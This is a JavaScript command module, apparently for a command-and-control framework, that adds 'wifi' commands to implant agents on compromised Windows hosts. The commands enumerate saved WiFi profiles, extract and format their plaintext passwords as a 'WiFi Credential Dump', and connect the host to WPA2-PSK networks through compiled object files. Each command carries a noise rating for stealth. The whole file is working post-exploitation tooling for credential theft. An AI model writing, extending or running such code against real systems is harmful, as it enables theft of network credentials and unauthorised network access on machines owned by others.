var metadata = {
    name: "wifi",
    description: "WiFi enumeration, dump & authentication via WLAN API."
};

// ── wifi enum ────────────────────────────────────────────────
var _cmd_wifi_enum = ax.create_command(
    "enum",
    "List WiFi profiles saved on the system. [NOISE: low]",
    "wifi enum");
_cmd_wifi_enum.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var bof_path = ax.script_dir() + "_bin/wifidump_enum." + ax.arch(id) + ".o";
    if (!ax.file_exists(bof_path)) {
        ax.console_message(id, "BOF not found: " + bof_path, "error",
            "Compile wifidump.c and place the .o files under _bin/ next to this script.");
        return;
    }
    ax.execute_alias(id, cmdline,
        `execute bof ${bof_path}`,
        "Task: WiFi profile enumeration (BOF)", null);
});

// ── wifi dump ────────────────────────────────────────────────
var _cmd_wifi_dump = ax.create_command(
    "dump",
    "Retrieve the plaintext password from a saved WiFi profile. [NOISE: low]",
    "wifi dump \"NetworkName\"");
_cmd_wifi_dump.addArgString("profile", true, "Exact WiFi profile name (case-sensitive)");
_cmd_wifi_dump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var profile = parsed_json["profile"] || "";
    if (!profile) {
        ax.console_message(id, "Profile name is missing.", "error",
            "Usage: wifi dump \"NetworkName\"");
        return;
    }
    var bof_path   = ax.script_dir() + "_bin/wifidump_dump." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("wstr", [profile]);
    if (!ax.file_exists(bof_path)) {
        ax.console_message(id, "BOF not found: " + bof_path, "error",
            "Compile wifidump.c and place the .o files under _bin/ next to this script.");
        return;
    }
    var hook = function (task) {
        if (!task.text || task.text.indexOf("<WLANProfile") === -1) return task;
        function xmlTag(tag, text) {
            var re = new RegExp("<" + tag + "[^>]*>([^<]*)<\\/" + tag + ">");
            var m = re.exec(text);
            return m ? m[1].trim() : null;
        }
        var ifaceMatch = /\[\+\] Profile XML \(([^)]+)\)/.exec(task.text);
        var iface    = ifaceMatch ? ifaceMatch[1] : "unknown";
        var ssid     = xmlTag("name",           task.text);
        var auth     = xmlTag("authentication", task.text);
        var enc      = xmlTag("encryption",     task.text);
        var keyType  = xmlTag("keyType",        task.text);
        var password = xmlTag("keyMaterial",    task.text);
        var prot     = xmlTag("protected",      task.text);
        var out  = "\n[WiFi Credential Dump]\n";
        out += "  Interface : " + iface + "\n";
        out += "  SSID      : " + (ssid    || "?") + "\n";
        out += "  Auth      : " + (auth    || "?") + "\n";
        out += "  Encryption: " + (enc     || "?") + "\n";
        out += "  Key type  : " + (keyType || "?") + "\n";
        out += "  Password  : " + (prot === "true"
            ? "(protected — requires SYSTEM to read in plaintext)"
            : (password || "(not set / open network)")) + "\n";
        task.text = out;
        return task;
    };
    ax.execute_alias_hook(id, cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: WiFi dump '" + profile + "' (BOF)", hook);
});

// ── wifi auth ────────────────────────────────────────────────
var _cmd_wifi_auth = ax.create_command(
    "auth",
    "Connect to a WPA2-PSK network by registering a profile and calling WlanConnect. [NOISE: medium]",
    "wifi auth \"NetworkName\" \"password\"");
_cmd_wifi_auth.addArgString("ssid",     true, "Target network SSID (case-sensitive)");
_cmd_wifi_auth.addArgString("password", true, "WPA2-PSK password (minimum 8 characters)");
_cmd_wifi_auth.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var ssid = parsed_json["ssid"]     || "";
    var pass = parsed_json["password"] || "";
    if (!ssid) {
        ax.console_message(id, "SSID is missing.", "error",
            "Usage: wifi auth \"NetworkName\" \"password\"");
        return;
    }
    if (pass.length < 8) {
        ax.console_message(id, "WPA2-PSK password must be at least 8 characters long.", "error", "");
        return;
    }
    var bof_path   = ax.script_dir() + "_bin/wifidump_auth." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("wstr,wstr", [ssid, pass]);
    if (!ax.file_exists(bof_path)) {
        ax.console_message(id, "BOF not found: " + bof_path, "error",
            "Compile wifidump.c and place the .o files under _bin/ next to this script.");
        return;
    }
    ax.execute_alias(id, cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: WiFi auth -> '" + ssid + "' (BOF)", null);
});

// ── Register group ───────────────────────────────────────────
var cmd_wifi = ax.create_command(
    "wifi",
    "WiFi enumeration, dump & authentication via WLAN API.",
    "wifi enum | wifi dump \"NetworkName\" | wifi auth \"NetworkName\" \"password\"");
cmd_wifi.addSubCommands([_cmd_wifi_enum, _cmd_wifi_dump, _cmd_wifi_auth]);

var group_wifi = ax.create_commands_group("wifi", [cmd_wifi]);
ax.register_commands_group(group_wifi, ["beacon", "gopher", "kharon", "NoNameAx"], ["windows"], []);
